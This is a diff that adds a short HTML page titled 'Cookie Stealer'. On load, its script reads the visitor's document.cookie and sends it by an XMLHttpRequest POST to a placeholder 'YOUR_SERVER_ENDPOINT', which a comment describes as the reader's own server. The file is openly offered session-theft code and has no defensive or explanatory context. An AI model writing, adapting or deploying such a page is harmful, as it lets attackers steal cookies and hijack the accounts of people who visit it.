@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Stealer</title>
+</head>
+<body>
+    <script>
+        // Function to send cookies to your server
+        function sendCookies() {
+            var cookies = document.cookie;
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "YOUR_SERVER_ENDPOINT", true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.send(JSON.stringify({ cookies: cookies }));
+        }
+
+        // Call the function when the page loads
+        window.onload = sendCookies;
+    </script>
+</body>
+</html>
